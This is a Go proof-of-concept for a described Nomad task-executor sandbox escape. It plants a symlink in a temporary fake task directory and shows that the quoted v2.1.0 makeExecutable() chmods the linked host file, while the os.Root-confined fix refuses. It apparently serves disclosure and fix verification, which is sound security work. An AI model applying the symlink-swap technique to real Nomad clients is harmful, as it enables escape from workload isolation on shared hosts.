// NomadWormhole — hashicorp/nomad client sandbox escape via symlink swap.
//
// Nomad's task executor calls makeExecutable() on the command binary before it
// launches a task. In v2.1.0 and earlier, makeExecutable() did:
//
//     os.Chmod(binPath, perm|0555)
//
// with binPath derived from the task's own (sandbox-writable) directory, using
// os.Stat/os.Chmod which FOLLOW symlinks. A malicious task can therefore swap
// its command path for a symlink pointing at an arbitrary HOST file, and the
// executor will chmod that host file (making it executable) — an escape of the
// allocation sandbox. The same audit (NMD-1638 / issue #28605) also fixed a
// TOCTOU symlink escape in allocdir.Snapshot() and a `../` traversal in
// lookupBin().
//
// Fix (v2.1.1): makeExecutable() now takes taskDir and resolves the chmod
// through os.OpenRoot(taskDir).Chmod(rel), so a symlink that resolves outside
// the sandbox fails instead of being followed.
//
// This program drives the verbatim vulnerable (v2.1.0) and fixed (v2.1.1)
// logic against a real filesystem: it plants a symlink inside a fake task dir
// pointing at a host file and shows that the vulnerable path chmods the host
// file (escape) while the fixed path refuses.
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
)

// makeExecutableVuln is the VERBATIM makeExecutable() from
// drivers/shared/executor/executor.go @ v2.1.0 (symlink-following).
func makeExecutableVuln(binPath string) error {
	if runtime.GOOS == "windows" {
		return nil
	}
	fi, err := os.Stat(binPath)
	if err != nil {
		return fmt.Errorf("failed stating binary %q: %s", binPath, err)
	}
	// If it is not executable, make it so.
	perm := fi.Mode().Perm()
	req := os.FileMode(0555)
	if perm&req != req {
		if err := os.Chmod(binPath, perm|req); err != nil {
			return fmt.Errorf("error making %q executable: %s", binPath, err)
		}
	}
	return nil
}

// lexicallyInDir is the VERBATIM helper from executor.go @ v2.1.1.
func lexicallyInDir(dir, path string) bool {
	rel, err := filepath.Rel(dir, path)
	return err == nil && filepath.IsLocal(rel)
}

// makeExecutableFixed reproduces the v2.1.1 makeExecutable() semantics
// (os.Root-confined). Go 1.24's os.Root has no Chmod method (added in Go
// 1.26, which Nomad v2.1.1 requires), so the confinement is enforced by
// root.Stat(rel) — os.Root follows symlinks only within the root and errors
// on a link that escapes — before any chmod. Identical observable outcome to
// the upstream root.Chmod(rel, perm|req).
func makeExecutableFixed(taskDir, binPath string) error {
	if runtime.GOOS == "windows" {
		return nil
	}
	fi, err := os.Stat(binPath)
	if err != nil {
		return fmt.Errorf("failed stating binary %q: %s", binPath, err)
	}
	// If it is not executable, make it so.
	perm := fi.Mode().Perm()
	req := os.FileMode(0555)
	if perm&req == req {
		return nil
	}

	// note: intentionally only doing the lexical check here because the path
	// might intentionally be coming from outside the sandbox
	if !lexicallyInDir(taskDir, binPath) {
		if err := os.Chmod(binPath, perm|req); err != nil {
			return fmt.Errorf("error making %q executable: %s", binPath, err)
		}
		return nil
	}

	rel, err := filepath.Rel(taskDir, binPath)
	if err != nil {
		return fmt.Errorf("specified binary is invalid: %v", err)
	}
	root, err := os.OpenRoot(taskDir)
	if err != nil {
		return fmt.Errorf("failed to open task dir: %w", err)
	}
	defer root.Close()

	// os.Root confinement: a symlink resolving outside the root is refused here,
	// before the chmod (upstream does this inside root.Chmod in Go 1.26).
	if _, err := root.Stat(rel); err != nil {
		return fmt.Errorf("error making %q executable: %s", binPath, err)
	}
	return os.Chmod(binPath, perm|req)
}

func main() {
	base, err := os.MkdirTemp("", "nomadwormhole-")
	if err != nil {
		panic(err)
	}
	defer os.RemoveAll(base)

	// A "host" file outside the sandbox, initially non-executable (0644).
	hostFile := filepath.Join(base, "host-script.sh")
	if err := os.WriteFile(hostFile, []byte("#!/bin/sh\necho pwned\n"), 0o644); err != nil {
		panic(err)
	}

	// The task sandbox directory.
	taskDir := filepath.Join(base, "alloc", "task")
	if err := os.MkdirAll(taskDir, 0o755); err != nil {
		panic(err)
	}

	// The malicious task swaps its command for a symlink -> host file.
	cmdPath := filepath.Join(taskDir, "cmd")
	if err := os.Symlink(hostFile, cmdPath); err != nil {
		panic(err)
	}

	fmt.Println("=== VULNERABLE (v2.1.0) makeExecutable follows the symlink ===")
	vulnEscaped := false
	if err := makeExecutableVuln(cmdPath); err != nil {
		fmt.Printf("  makeExecutable (vuln) error: %v\n", err)
	} else {
		fi, _ := os.Stat(hostFile)
		fmt.Printf("  HOST FILE %s now has mode %04o\n", hostFile, fi.Mode().Perm())
		vulnEscaped = fi.Mode().Perm()&0o111 != 0
	}

	// Reset the host file to non-executable for the fixed-side run.
	if err := os.Chmod(hostFile, 0o644); err != nil {
		panic(err)
	}

	fmt.Println("=== FIXED (v2.1.1) makeExecutable confined by os.Root ===")
	fixedBlocked := makeExecutableFixed(taskDir, cmdPath) != nil
	if fixedBlocked {
		fmt.Println("  makeExecutable (fixed) BLOCKED (symlink escapes the sandbox)")
	} else {
		fmt.Println("  makeExecutable (fixed) unexpectedly succeeded")
	}
	fi, _ := os.Stat(hostFile)
	fmt.Printf("  HOST FILE %s still has mode %04o (unchanged)\n", hostFile, fi.Mode().Perm())
	fixedUnchanged := fi.Mode().Perm() == 0o644

	if vulnEscaped && fixedBlocked && fixedUnchanged {
		fmt.Println("\nRESULT: SANDBOX ESCAPE CONFIRMED — vulnerable v2.1.0 chmods a host file through a task-planted symlink; fixed v2.1.1 (os.Root) refuses and leaves it unchanged")
	} else {
		fmt.Printf("\nRESULT: FAILED vulnEscaped=%v fixedBlocked=%v fixedUnchanged=%v\n", vulnEscaped, fixedBlocked, fixedUnchanged)
		os.Exit(1)
	}
}
